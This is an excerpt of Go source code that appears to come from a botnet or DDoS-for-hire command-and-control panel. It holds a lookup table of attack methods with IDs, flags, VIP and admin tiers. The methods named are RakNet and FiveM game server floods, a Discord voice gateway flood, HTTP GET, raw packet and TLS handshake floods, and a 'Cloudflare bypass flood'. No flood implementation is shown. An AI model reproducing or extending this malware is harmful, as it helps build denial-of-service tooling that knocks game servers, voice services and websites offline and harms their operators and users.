...
var attackInfoLookup = map[string]AttackInfo{
	...
	"raknet": {
		ID:          15,
		Flags:       []uint8{0, 2, 3, 4, 5, 6, 7, 25, 30},
		Description: "RakNet game server flood",
		Vip:         false,
		Admin:       false,
		Disabled:    "",
	},
	"fivem": {
		ID:          18,
		Flags:       []uint8{0, 6, 7, 30},
		Description: "FiveM game server connect flood",
		Vip:         false,
		Admin:       false,
		Disabled:    "",
	},
	"discord": {
		ID:          19,
		Flags:       []uint8{0, 6, 7, 30},
		Description: "Discord voice gateway flood",
		Vip:         false,
		Admin:       false,
		Disabled:    "",
	},
	"http": {
		ID:          20,
		Flags:       []uint8{0, 6, 7, 30},
		Description: "HTTP/1.1 GET flood",
		Vip:         false,
		Admin:       false,
		Disabled:    "",
	},
	"pps": {
		ID:          21,
		Flags:       []uint8{0, 6, 7, 30},
		Description: "PPS (packets per second) raw flood",
		Vip:         false,
		Admin:       false,
		Disabled:    "",
	},
	"tls": {
		ID:          22,
		Flags:       []uint8{0, 6, 7, 30},
		Description: "TLS/SSL handshake flood",
		Vip:         false,
		Admin:       false,
		Disabled:    "",
	},
	...
	"cloudflare": {
		ID:          24,
		Flags:       []uint8{0, 6, 7, 30},
		Description: "Cloudflare bypass flood",
		Vip:         false,
		Admin:       false,
		Disabled:    "",
	},
